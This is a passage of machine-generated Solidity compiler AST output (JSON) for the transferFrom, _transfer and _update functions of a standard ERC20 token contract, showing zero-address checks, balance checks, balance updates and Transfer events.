"nodeType":"Block","src":"5132:151:2","statements":[{"assignments":[463],"declarations":[{"constant":false,"id":463,"mutability":"mutable","name":"spender","nameLocation":"5150:7:2","nodeType":"VariableDeclaration","scope":481,"src":"5142:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":462,"name":"address","nodeType":"ElementaryTypeName","src":"5142:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":466,"initialValue":{"arguments":[],"expression":{"argumentTypes":[],"id":464,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":915,"src":"5160:10:2","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":465,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5160:12:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"VariableDeclarationStatement","src":"5142:30:2"},{"expression":{"arguments":[{"id":468,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":453,"src":"5198:4:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":469,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":463,"src":"5204:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":470,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":457,"src":"5213:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":467,"name":"_spendAllowance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":798,"src":"5182:15:2","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":471,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5182:37:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":472,"nodeType":"ExpressionStatement","src":"5182:37:2"},{"expression":{"arguments":[{"id":474,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":453,"src":"5239:4:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":475,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":455,"src":"5245:2:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":476,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":457,"src":"5249:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":473,"name":"_transfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":529,"src":"5229:9:2","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":477,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5229:26:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":478,"nodeType":"ExpressionStatement","src":"5229:26:2"},{"expression":{"hexValue":"74727565","id":479,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"5272:4:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},"functionReturnParameters":461,"id":480,"nodeType":"Return","src":"5265:11:2"}]},"documentation":{"id":451,"nodeType":"StructuredDocumentation","src":"4485:549:2","text":" @dev See {IERC20-transferFrom}.\n Emits an {Approval} event indicating the updated allowance. This is not\n required by the EIP. See the note at the beginning of {ERC20}.\n NOTE: Does not update the allowance if the current allowance\n is the maximum `uint256`.\n Requirements:\n - `from` and `to` cannot be the zero address.\n - `from` must have a balance of at least `value`.\n - the caller must have allowance for ``from``'s tokens of at least\n `value`."},"functionSelector":"23b872dd","id":482,"implemented":true,"kind":"function","modifiers":[],"name":"transferFrom","nameLocation":"5048:12:2","nodeType":"FunctionDefinition","parameters":{"id":458,"nodeType":"ParameterList","parameters":[{"constant":false,"id":453,"mutability":"mutable","name":"from","nameLocation":"5069:4:2","nodeType":"VariableDeclaration","scope":482,"src":"5061:12:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":452,"name":"address","nodeType":"ElementaryTypeName","src":"5061:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":455,"mutability":"mutable","name":"to","nameLocation":"5083:2:2","nodeType":"VariableDeclaration","scope":482,"src":"5075:10:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":454,"name":"address","nodeType":"ElementaryTypeName","src":"5075:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":457,"mutability":"mutable","name":"value","nameLocation":"5095:5:2","nodeType":"VariableDeclaration","scope":482,"src":"5087:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":456,"name":"uint256","nodeType":"ElementaryTypeName","src":"5087:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5060:41:2"},"returnParameters":{"id":461,"nodeType":"ParameterList","parameters":[{"constant":false,"id":460,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":482,"src":"5126:4:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":459,"name":"bool","nodeType":"ElementaryTypeName","src":"5126:4:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"5125:6:2"},"scope":799,"src":"5039:244:2","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"body":{"id":528,"nodeType":"Block","src":"5725:231:2","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":497,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":492,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":485,"src":"5739:4:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":495,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5755:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":494,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5747:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":493,"name":"address","nodeType":"ElementaryTypeName","src":"5747:7:2","typeDescriptions":{}}},"id":496,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5747:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"5739:18:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":506,"nodeType":"IfStatement","src":"5735:86:2","trueBody":{"id":505,"nodeType":"Block","src":"5759:62:2","statements":[{"errorCall":{"arguments":[{"arguments":[{"hexValue":"30","id":501,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5807:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":500,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5799:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":499,"name":"address","nodeType":"ElementaryTypeName","src":"5799:7:2","typeDescriptions":{}}},"id":502,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5799:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":498,"name":"ERC20InvalidSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":164,"src":"5780:18:2","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$__$","typeString":"function (address) pure"}},"id":503,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5780:30:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":504,"nodeType":"RevertStatement","src":"5773:37:2"}]}},{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":512,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":507,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":487,"src":"5834:2:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":510,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5848:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":509,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5840:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":508,"name":"address","nodeType":"ElementaryTypeName","src":"5840:7:2","typeDescriptions":{}}},"id":511,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5840:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"5834:16:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":521,"nodeType":"IfStatement","src":"5830:86:2","trueBody":{"id":520,"nodeType":"Block","src":"5852:64:2","statements":[{"errorCall":{"arguments":[{"arguments":[{"hexValue":"30","id":516,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5902:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":515,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5894:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":514,"name":"address","nodeType":"ElementaryTypeName","src":"5894:7:2","typeDescriptions":{}}},"id":517,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5894:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":513,"name":"ERC20InvalidReceiver","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":169,"src":"5873:20:2","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$__$","typeString":"function (address) pure"}},"id":518,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5873:32:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":519,"nodeType":"RevertStatement","src":"5866:39:2"}]}},{"expression":{"arguments":[{"id":523,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":485,"src":"5933:4:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":524,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":487,"src":"5939:2:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":525,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":489,"src":"5943:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":522,"name":"_update","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":606,"src":"5925:7:2","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":526,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5925:24:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":527,"nodeType":"ExpressionStatement","src":"5925:24:2"}]},"documentation":{"id":483,"nodeType":"StructuredDocumentation","src":"5289:362:2","text":" @dev Moves a `value` amount of tokens from `from` to `to`.\n This internal function is equivalent to {transfer}, and can be used to\n e.g. implement automatic token fees, slashing mechanisms, etc.\n Emits a {Transfer} event.\n NOTE: This function is not virtual, {_update} should be overridden instead."},"id":529,"implemented":true,"kind":"function","modifiers":[],"name":"_transfer","nameLocation":"5665:9:2","nodeType":"FunctionDefinition","parameters":{"id":490,"nodeType":"ParameterList","parameters":[{"constant":false,"id":485,"mutability":"mutable","name":"from","nameLocation":"5683:4:2","nodeType":"VariableDeclaration","scope":529,"src":"5675:12:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":484,"name":"address","nodeType":"ElementaryTypeName","src":"5675:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":487,"mutability":"mutable","name":"to","nameLocation":"5697:2:2","nodeType":"VariableDeclaration","scope":529,"src":"5689:10:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":486,"name":"address","nodeType":"ElementaryTypeName","src":"5689:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":489,"mutability":"mutable","name":"value","nameLocation":"5709:5:2","nodeType":"VariableDeclaration","scope":529,"src":"5701:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":488,"name":"uint256","nodeType":"ElementaryTypeName","src":"5701:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5674:41:2"},"returnParameters":{"id":491,"nodeType":"ParameterList","parameters":[],"src":"5725:0:2"},"scope":799,"src":"5656:300:2","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":605,"nodeType":"Block","src":"6346:1032:2","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":544,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":539,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":532,"src":"6360:4:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":542,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6376:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":541,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6368:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":540,"name":"address","nodeType":"ElementaryTypeName","src":"6368:7:2","typeDescriptions":{}}},"id":543,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6368:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"6360:18:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"id":576,"nodeType":"Block","src":"6534:362:2","statements":[{"assignments":[551],"declarations":[{"constant":false,"id":551,"mutability":"mutable","name":"fromBalance","nameLocation":"6556:11:2","nodeType":"VariableDeclaration","scope":576,"src":"6548:19:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":550,"name":"uint256","nodeType":"ElementaryTypeName","src":"6548:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":555,"initialValue":{"baseExpression":{"id":552,"name":"_balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":307,"src":"6570:9:2","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":554,"indexExpression":{"id":553,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":532,"src":"6580:4:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"6570:15:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"6548:37:2"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":558,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":556,"name":"fromBalance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":551,"src":"6603:11:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":557,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":536,"src":"6617:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"6603:19:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":566,"nodeType":"IfStatement","src":"6599:115:2","trueBody":{"id":565,"nodeType":"Block","src":"6624:90:2","statements":[{"errorCall":{"arguments":[{"id":560,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":532,"src":"6674:4:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":561,"name":"fromBalance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":551,"src":"6680:11:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":562,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":536,"src":"6693:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":559,"name":"ERC20InsufficientBalance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":159,"src":"6649:24:2","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,uint256,uint256) pure"}},"id":563,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6649:50:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":564,"nodeType":"RevertStatement","src":"6642:57:2"}]}},{"id":575,"nodeType":"UncheckedBlock","src":"6727:159:2","statements":[{"expression":{"id":573,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":567,"name":"_balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":307,"src":"6834:9:2","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":569,"indexExpression":{"id":568,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":532,"src":"6844:4:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"6834:15:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":572,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":570,"name":"fromBalance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":551,"src":"6852:11:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"id":571,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":536,"src":"6866:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"6852:19:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"6834:37:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":574,"nodeType":"ExpressionStatement","src":"6834:37:2"}]}]},"id":577,"nodeType":"IfStatement","src":"6356:540:2","trueBody":{"id":549,"nodeType":"Block","src":"6380:148:2","statements":[{"expression":{"id":547,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":545,"name":"_totalSupply","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":315,"src":"6496:12:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"id":546,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":536,"src":"6512:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"6496:21:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":548,"nodeType":"ExpressionStatement","src":"6496:21:2"}]}},{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":583,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":578,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":534,"src":"6910:2:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":581,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6924:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":580,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6916:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":579,"name":"address","nodeType":"ElementaryTypeName","src":"6916:7:2","typeDescriptions":{}}},"id":582,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6916:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"6910:16:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"id":597,"nodeType":"Block","src":"7125:206:2","statements":[{"id":596,"nodeType":"UncheckedBlock","src":"7139:182:2","statements":[{"expression":{"id":594,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":590,"name":"_balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":307,"src":"7284:9:2","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":592,"indexExpression":{"id":591,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":534,"src":"7294:2:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"7284:13:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"id":593,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":536,"src":"7301:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7284:22:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":595,"nodeType":"ExpressionStatement","src":"7284:22:2"}]}]},"id":598,"nodeType":"IfStatement","src":"6906:425:2","trueBody":{"id":589,"nodeType":"Block","src":"6928:191:2","statements":[{"id":588,"nodeType":"UncheckedBlock","src":"6942:167:2","statements":[{"expression":{"id":586,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":584,"name":"_totalSupply","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":315,"src":"7073:12:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"-=","rightHandSide":{"id":585,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":536,"src":"7089:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7073:21:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":587,"nodeType":"ExpressionStatement","src":"7073:21:2"}]}]}},{"eventCall":{"arguments":[{"id":600,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":532,"src":"7355:4:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":601,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":534,"src":"7361:2:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":602,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":536,"src":"7365:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":599,"name":"Transfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":811,"src":"7346:8:2","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":603,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7346:25:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":604,"nodeType":"EmitStatement","src":"7341:30:2"}]},"documentation":{"id":530,"nodeType":"StructuredDocumentation","src":"5962:304:2","text":" @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n this function.\n Emits a {Transfer} 